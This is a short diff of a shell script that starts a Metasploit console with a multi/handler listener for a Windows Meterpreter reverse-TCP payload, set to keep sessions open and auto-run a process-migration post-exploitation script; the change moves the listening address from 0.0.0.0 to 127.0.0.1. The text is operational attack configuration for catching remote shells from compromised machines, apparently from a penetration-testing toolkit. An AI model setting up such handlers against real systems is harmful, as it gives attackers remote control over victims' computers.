@@ -18,7 +18,7 @@ tput cnorm
 # Start the Metasploit framework console with a handler
 msfconsole -q -x "use exploit/multi/handler; \
                   set PAYLOAD windows/meterpreter/reverse_tcp; \
-                  set LHOST 0.0.0.0; \
+                  set LHOST 127.0.0.1; \
                   set LPORT 5040; \
                   set ExitOnSession false; \
 		  set AutoRunScript /post/windows/manage/migrate; \
